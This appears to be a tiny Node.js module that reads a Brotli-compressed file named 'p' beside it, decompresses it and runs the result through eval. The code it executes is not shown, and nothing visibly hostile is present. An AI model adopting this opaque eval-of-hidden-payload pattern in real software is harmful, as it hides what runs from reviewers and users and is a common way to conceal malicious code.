import*as f from'node:fs'
import*as z from'node:zlib'
eval(z.brotliDecompressSync(f.readFileSync(new URL('p',import.meta.url)))+'')
